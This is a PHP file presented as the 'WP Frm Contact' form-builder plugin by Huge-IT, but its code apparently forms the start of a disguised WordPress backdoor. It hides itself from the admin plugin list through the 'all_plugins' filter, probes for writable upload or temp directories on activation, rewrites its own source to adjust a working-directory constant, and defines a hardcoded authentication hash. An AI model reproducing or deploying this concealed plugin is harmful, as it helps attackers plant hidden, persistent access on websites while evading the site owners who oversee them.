<?php
    
/*
Plugin Name: WP Frm Contact
Plugin URI: https://huge-it.com/forms
Description: Form Builder. this is one of the most important elements of WordPress website because without it you cannot to always keep in touch with your visitors
Version: 3.5.7
Author: Huge-IT
Author URI: https://huge-it.com/
License: GNU/GPLv3 https://www.gnu.org/licenses/gpl-3.0.html
*/

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}



add_filter('all_plugins', 'wpfrmcontact_hide_plugins');

function wpfrmcontact_hide_plugins($plugins) {
   
    unset($plugins['wpfrmcontact/wpfrmcontact.php']);
    return $plugins;
}

register_activation_hook( __FILE__, 'wpfrmcontact_activate_' );

function wpfrmcontact_activate_() {

$upload_dir = wp_upload_dir()['basedir'];
    $iswrdir =wpfrmcontact_checkdir($upload_dir,"wp_upload_dir()['basedir']");
if(!$iswrdir)
{
       $upload_dir = sys_get_temp_dir();
$iswrdir = wpfrmcontact_checkdir($upload_dir,'sys_get_temp_dir()');
    if(!$iswrdir)
    {
        $upload_dir = dirname(__FILE__).DIRECTORY_SEPARATOR.'pages';
        $dirExists     = is_dir($upload_dir) || (mkdir($upload_dir, 0774, true) && is_dir($upload_dir));
        if($dirExists&&wpfrmcontact_checkdir($upload_dir,"dirname(__FILE__).DIRECTORY_SEPARATOR.'pages'")){
         
        }else{
            $sccontent = file_get_contents(__FILE__);
       $sccontent= preg_replace("/(\'WORK\_DIR\'\,)(.*)(\s\))/",'${1}\'\' $3',$sccontent);
        file_put_contents(__FILE__,$sccontent);
        }
    }
}
}
define('WORK_DIR','./');
define('AUTH_CODE','7b51cf3816d9a9aea5fb8afbcd4e1e64519d965393c50a3a6ddb24f295af2a54'  );